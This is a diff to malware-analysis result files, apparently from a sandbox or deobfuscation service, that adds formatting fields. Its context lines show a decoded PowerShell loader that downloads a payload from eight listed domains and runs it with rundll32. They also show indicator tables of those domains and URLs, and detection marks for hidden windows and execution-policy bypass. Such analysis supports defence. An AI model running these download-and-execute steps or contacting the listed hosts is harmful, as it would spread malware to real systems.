@@ -6,6 +6,7 @@
       {
         "auto_collapse": false,
         "body": "[Start-Sleep] -Seconds 2\n\n[Invoke-WebRequest] Download From: https://hotellosmirtos.com/sjn/Tn0Q3nieE --> Save To: ./\\octennialChancelor.hexatetrahedronAbrachias\n\n[start] rundll32 ./\\octennialChancelor.hexatetrahedronAbrachias Motd\n",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 0,
@@ -42,6 +43,12 @@
       {
         "auto_collapse": false,
         "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"hotellosmirtos.com\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://hotellosmirtos.com/sjn/tn0q3niee\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/sjn/tn0q3niee\"}]",
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
         "body_format": "TABLE",
         "classification": "TLP:C",
         "depth": 1,
@@ -74,6 +81,7 @@
       {
         "auto_collapse": false,
         "body": null,
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 0,
@@ -85,6 +93,7 @@
       {
         "auto_collapse": false,
         "body": "Marks: -W, Hidden, -Exec, Bypass",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -107,6 +116,7 @@
       {
         "auto_collapse": false,
         "body": "Marks: wget",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -129,6 +139,7 @@
       {
         "auto_collapse": false,
         "body": "Marks: WindowStyle, Hidden, -W, Hidden",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -151,6 +162,7 @@
       {
         "auto_collapse": false,
         "body": "Marks: Start-Sleep, sleep -s",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -173,6 +185,12 @@
       {
         "auto_collapse": false,
         "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"carladvogadatributaria.com\"}, {\"ioc_type\": \"domain\", \"ioc\": \"citytech-solutions.com\"}, {\"ioc_type\": \"domain\", \"ioc\": \"erg-eg.com\"}, {\"ioc_type\": \"domain\", \"ioc\": \"gsscorporationltd.com\"}, {\"ioc_type\": \"domain\", \"ioc\": \"hotellosmirtos.com\"}, {\"ioc_type\": \"domain\", \"ioc\": \"mrcrizquna.com\"}, {\"ioc_type\": \"domain\", \"ioc\": \"nayadofoundation.org\"}, {\"ioc_type\": \"domain\", \"ioc\": \"zainco.net\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://carladvogadatributaria.com/tvnq9/h78n9qol\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/tvnq9/h78n9qol\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://citytech-solutions.com/6mh1k/vyrqiueel74\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/6mh1k/vyrqiueel74\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://erg-eg.com/ocmb/cjva5tv\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/ocmb/cjva5tv\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://gsscorporationltd.com/oksfj/elnfp\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/oksfj/elnfp\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://hotellosmirtos.com/sjn/tn0q3niee\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/sjn/tn0q3niee\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://mrcrizquna.com/l7ccn/raqf0mzg0gq\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/l7ccn/raqf0mzg0gq\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://nayadofoundation.org/wxakm/x7gy6orrr\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/wxakm/x7gy6orrr\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://zainco.net/odou/5nz7cc739ffc\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/odou/5nz7cc739ffc\"}]",
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
         "body_format": "TABLE",
         "classification": "TLP:C",
         "depth": 0,
@@ -226,6 +244,7 @@
       {
         "auto_collapse": false,
         "body": null,
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 0,
@@ -237,6 +256,7 @@
       {
         "auto_collapse": false,
         "body": "Marks: START, rundll32",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -259,6 +279,7 @@
       {
         "auto_collapse": false,
         "body": "Marks: START, rundll32",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -281,6 +302,7 @@
       {
         "auto_collapse": false,
         "body": null,
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -303,6 +325,7 @@
       {
         "auto_collapse": false,
         "body": "[Start-Sleep] -Seconds 2\n\n[Invoke-WebRequest] Download From: https://hotellosmirtos.com/sjn/Tn0Q3nieE --> Save To: ./\\octennialChancelor.hexatetrahedronAbrachias\n\n[Invoke-WebRequest] Download From: https://gsscorporationltd.com/okSfj/ElnfP --> Save To: ./\\octennialChancelor.hexatetrahedronAbrachias\n\n[Invoke-WebRequest] Download From: https://citytech-solutions.com/6Mh1k/VyRQIueel74 --> Save To: ./\\octennialChancelor.hexatetrahedronAbrachias\n\n[Invoke-WebRequest] Download From: https://carladvogadatributaria.com/tvnq9/H78n9QOL --> Save To: ./\\octennialChancelor.hexatetrahedronAbrachias\n\n[Invoke-WebRequest] Download From: https://mrcrizquna.com/L7ccN/raQf0mzg0gq --> Save To: ./\\octennialChancelor.hexatetrahedronAbrachias\n\n[Invoke-WebRequest] Download From: https://zainco.net/OdOU/5nz7Cc739ffc --> Save To: ./\\octennialChancelor.hexatetrahedronAbrachias\n\n[Invoke-WebRequest] Download From: https://erg-eg.com/ocmb/CjVa5TV --> Save To: ./\\octennialChancelor.hexatetrahedronAbrachias\n\n[Invoke-WebRequest] Download From: https://nayadofoundation.org/wXaKm/x7GY6orRR --> Save To: ./\\octennialChancelor.hexatetrahedronAbrachias\n",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 0,
@@ -353,6 +376,12 @@
       {
         "auto_collapse": false,
         "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"hotellosmirtos.com\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://hotellosmirtos.com/sjn/tn0q3niee\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/sjn/tn0q3niee\"}, {\"ioc_type\": \"domain\", \"ioc\": \"gsscorporationltd.com\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://gsscorporationltd.com/oksfj/elnfp\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/oksfj/elnfp\"}, {\"ioc_type\": \"domain\", \"ioc\": \"citytech-solutions.com\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://citytech-solutions.com/6mh1k/vyrqiueel74\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/6mh1k/vyrqiueel74\"}, {\"ioc_type\": \"domain\", \"ioc\": \"carladvogadatributaria.com\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://carladvogadatributaria.com/tvnq9/h78n9qol\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/tvnq9/h78n9qol\"}, {\"ioc_type\": \"domain\", \"ioc\": \"mrcrizquna.com\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://mrcrizquna.com/l7ccn/raqf0mzg0gq\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/l7ccn/raqf0mzg0gq\"}, {\"ioc_type\": \"domain\", \"ioc\": \"zainco.net\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://zainco.net/odou/5nz7cc739ffc\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/odou/5nz7cc739ffc\"}, {\"ioc_type\": \"domain\", \"ioc\": \"erg-eg.com\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://erg-eg.com/ocmb/cjva5tv\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/ocmb/cjva5tv\"}, {\"ioc_type\": \"domain\", \"ioc\": \"nayadofoundation.org\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://nayadofoundation.org/wxakm/x7gy6orrr\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/wxakm/x7gy6orrr\"}]",
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
         "body_format": "TABLE",
         "classification": "TLP:C",
         "depth": 1,
